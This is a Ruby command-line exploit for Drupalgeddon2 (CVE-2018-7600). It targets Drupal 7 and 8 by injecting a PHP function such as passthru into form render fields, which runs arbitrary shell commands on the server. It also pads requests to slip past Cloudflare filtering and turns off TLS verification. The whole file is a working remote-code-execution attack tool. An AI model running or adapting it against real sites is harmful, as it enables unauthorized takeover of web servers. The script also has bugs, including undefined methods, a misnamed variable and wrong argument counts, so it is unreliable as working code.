#!/usr/bin/env ruby

# This version works both Drupal 8.X and Drupal 7.X
require 'bundler/inline'
require 'optionparser'
require 'readline'
require 'net/http'
require 'openssl'
require 'base64'
require 'json'

# Check external gems and install it automatecally
begin
  require 'nokogiri'
rescue Exception => e
  include Utils
  puts error('Missing gems.')
  yes = ask('Do you want me to install it for you?[y/n] ')
  if yes[0] == /y/i
    puts action('Installing missing gems...')
    gemfile do
      source 'https://rubygems.org'
      gem 'nokogiri', require: true
    end
    puts success('Done')
  else
    puts ask('As you like.')
    puts e, e.message
    exit!
  end

end


#
# Utils module for general and unrelated operations
#
module Utils

  # Green | Feedback when all good
  def success(text); "\e[#{32}m[+]\e[0m #{text}"; end
  # Red | Feedback when something goes wrong
  def error(text);   "\e[#{31}m[-]\e[0m #{text}"; end
  # Yellow | Feedback when something may have issues
  def warning(text); "\e[#{33}m[!]\e[0m #{text}"; end
  # Blue | Feedback when something doing something
  def action(text);  "\e[#{34}m[*]\e[0m #{text}"; end
  # Light blue | Feedback with helpful information
  def info(text);    "\e[#{94}m[i]\e[0m #{text}"; end
  # Dark grey | Feedback for the overkill
  def verbose(text); "\e[#{90}m[v]\e[0m #{text}"; end


  # Interactive Console prompt to get user's input.
  # @param [String] question
  #   The question you want to print to the user
  # @param [String] answer
  #   The user's answer
  # @return
  #   [String]
  def ask(question, answer = nil)
    answer = Readline.readline(">> #{question}", true) while answer.nil? || answer.squeeze.strip.empty?
    answer
  end

  def self.banner
    "\n" + "\e[4m==[::#Drupalggedon2::]==\e[0m".center(83, '--') + "\n"      +
    "\e[1mRCE CVE-2018-7600\e[0m".center(83, ' ') + "\n" +
    "Drupal 8.5.x < 8.5.1 / 8.4.x < 8.4.6 / 8.x < 8.3.9 / 7.x? < 7.58 / < 6.x?\n" +
    "-" * 75 + "\n"
  end

end

#
# All target related operations
#
class Target
  include Utils

  # @param [String] host
  #   Host URL -> http://example.com
  # @param [String] php_method
  #   PHP method to use, by default passtrhu
  # @param [String] command
  #   Command to execute
  def initialize(host, command, php_method = 'passthru', form_path = 0)
    @host       = host
    @php_method = php_method
    @command    = command
    @uri        = URI.parse(host)
    @cf_bypass  = cf_bypass

    @form_path = form_path
    @http      = create_http
  end

  # Initiate HTTP connection
  # @return
  #   [Net::HTTP] object
  def create_http
    http = Net::HTTP.new(@uri.host, @uri.port)
    # Use SSL/TLS if needed
    if @uri.scheme == 'https'
      http.use_ssl = true
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    end

    return http
  end

  # check a response code,
  #   if 200, it means the target
  # @param [Net::HTTPRespone] response
  #   the reponse object of request
  # @return [Boolean]
  #   also, it cheers up if true
  def is_response_200?(response)
    if response.code == "200"
      success('Target seems to be exploitable! w00hooOO!')
      return true
    else
      failed('Response: ' + response.code)
      return false
    end
  end

  # search_in_html
  #   Parses any given value as an HTML and search in parsed HMLT document
  # @param [String] html
  #   A string contains html
  # @param [String] search_str
  #   The CSS search string to earch in the html document
  # @return [Nokogiri::HTML::Document]
  def search_in_html(html, search_str)
    html_doc = Nokogiri::HTML(html)
    html_doc.css(search_str)
  end

end

class Drupal8 < Target
  def initialize(host, command, php_method = 'passthru', form_path = 0)
    super(host, command, php_method, form_path)
  end

  # Not finished yet
  def exploit

    # Make the request
    params = 'element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax'
    if @cf_bypass
      params = 'a=&'*100 + params
    end

    post_path = "#{@uri.path}#{@form_path}/?#{params}"
    
    puts info("Requesting: #{post_path}")
    req       = Net::HTTP::Post.new(URI.encode(post_path))
    req.body  = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + 
                @php_method + "&mail[a][#type]=markup&mail[a][#markup]=" + @command

    if @cf_bypass
      req.body = 'a=&'*100 + req.body
    end

    puts info("POST: #{req.body}")
    res = @http.request(req)

    if is_response_200?(res) then 
      puts res.body.split('[{"command"')[0]
    end
  end
end

class Drupal7 < Target
  def initialize(host,command,php_method='passthru',form_path=0)
    super(host, command, php_method, form_path)
  end

  def get_form_build_id(response)
    form = search_in_html(response, 'form#user-pass')
    # returns either a new string (if a match is found) or nil
    form.to_s[/name="form_build_id" value="([^"]+)"/, 1]
  end

  def exploit

    payload = URI.encode("name[#post_render][]=#{@php_method}&name[#markup]=#{@command}&name[#type]=markup")
    if @form_path == '0'
      form  = '/?q=user/password&'
      form2 = '?q=file'
    else
      form  = '/user/password/?'
      form2 = 'file'
    end
    payload = @uri.path + form + payload

    puts info("Requesting: " + @uri.host + payload)
    puts info("POST: " + 'form_id=user_pass&_triggering_element_name=name')

    # First request, trying to obtain form_build_id
    req = Net::HTTP::Post.new(payload)
    req.body = 'form_id=user_pass&_triggering_element_name=name'

    res1 = @http.request(req)
    puts info(res.code)

    form_build_id = get_form_build_id(res1.body)

    if form_build_id
      puts action("Obtained build id!: #{form_build_id}")
      post_parameters = "form_build_id=#{form_build_id}"

      # Second Request
      req = Net::HTTP::Post.new(URI.encode("#{@uri.path}#{form2}/ajax/name/#value/#{form_build_id}"))
      puts info("Requesting: " + @uri.host + URI.encode("#{@uri.path}#{form2}/ajax/name/#value/#{form_build_id}"))
      puts info("POST: " + post_parameters)
      req.body = post_parameters

      res2 = @http.request(req)

      puts info("Response code: " + res2.code)

      if res2.body.split('[{"command"')[0] == ""
        if(@command != 'id')
          failed("Maybe incorrect input command, try simple command as 'id'")
        end
          failed("")
      end

      puts res2.body.split('[{"command"')[0]
    else
      puts '[!] Could not find form build ID.'
    end
  end
end


# 
# Option module to handle all command line options operations
# 
module Options

  # exploit_drupal select the proper exploit for the targeted version
  # 
  # @param [Integer] version
  #   The drupal version
  # @param [String] target
  #   The target URL
  # @param [String] command
  #   The command to be executed on the target after exploit
  # @param [String] php_method
  #   The PHP method to be exploited
  # @param [String] form_path
  #   The form path to be exploited
  # @return The exploit ;)
  # 
  # FIXME: what about authentication?
  # 
  def exploit_drupal(version, target, command, php_method, form_path)
    case version
    when "7"
      Drupal7.new(target, command, php_method, form_path).exploit
    when "8"
      Drupal8.new(target, command, php_method, form_path).exploit
    else
      Drupal8.new(target, command, php_method, form_path).exploit
    end
  end

  # cedentials method parses the given credentials seperated by column(:)
  # 
  # @param [String] creds
  #   @example:
  #     "root:Password@123"
  # @return [Hash]
  #   a hash contains {user: the_user, pass: the_pass}
  def credentials(creds)
    user, pass = creds.split(":", 2)
    {user: user, pass: pass}
  end

  def form_path(path)
    case path
    when 0 then '/?q=user/password'
    when 1 then '/user/password'
    else
      '/?q=user/password'
    end
  end

end

include Options
options = {}
option_parser = OptionParser.new
option_parser.banner = Utils.banner
option_parser.set_summary_indent '   '
option_parser.separator "\n\e[4mHelp menu:\e[0m"
option_parser.on('-u', '--URL <TARGET_URL>',
                 'The target URL to exploit.'
) {|v| options[:url] = v || ''}
option_parser.on('-a', '--authentication <USERNAME:PASSWORD>',
                 "Drupal authentication. If the option selected without giving credentials, you'll be asked later."
) {|v| v.kind_of?(String) ? options[:auth] = credentials(v) : options[:auth] = nil}

option_parser.on('-v', '--version <TARGET_VERSION>',
                 'Target Drupal version {7,8}.'
) {|v| options[:version] = v}

option_parser.on('-c', '--command <COMMAND>',
  'Target Drupal version {7,8}.'
) {|v| options[:command] = v}

option_parser.on('-m', '--method <PHP_METHOD>',
  'PHP Method to use. (default: passthru)'
) {|v| options[:php_method] = v}

option_parser.on('-p', '--form-path <FORM_PATH>',
  'The form path to be used. (default: 0)',
  "form_path: 0 => Vulnerable form on /?q=user/password\n" + 
  "form_path: 1 => Vulnerable form on /user/password"
) {|v| options[:form_path] = v}

option_parser.on('--verbose',
  'Print output verbosely.'
) {|v| options[:verbose] = v}
option_parser.on('-h', '--help', 'Show this help message') {puts option_parser; exit!}
option_parser.on_tail "\nUsage:\n" + 
                      "ruby drupalggedon2.rb -h <target> -v <version [7,8]> -c <command> -m [php_method] -p [form_path]"
option_parser.on_tail "\nExample:"
option_parser.on_tail %Q{ruby drupalgeddon-customizable-beta.rb -u http://example.com/ -v 7 -c id}


begin
  option_parser.parse!(ARGV)

  exploit_drupal(options[:version], options[:url]) if options[:version] && options[:url]
  
  exploit_drupal(options[:version], options[:url],
                 options[:command], options[:php_method],
                 form_path(options[:form_path]))   if options[:version] && options[:url] &&
                                                      options[:command] && options[:php_method] &&
                                                      options[:form_path]

  puts Utils.banner, option_parser    if options.empty?
rescue OptionParser::MissingArgument => e
  e.args.each {|arg| puts error("#{e.reason.capitalize} for '#{arg}' option.")}
  puts option_parser
rescue OptionParser::InvalidOption => e
  puts error(e)
  puts option_parser
rescue Exception => e
  puts error("Unknown Exception: option parser")
  puts error(e)
  puts e.backtrace_locations
  puts warning('Please report the issue at: https://github.com/dreadlocked/Drupalgeddon2/issues')
end
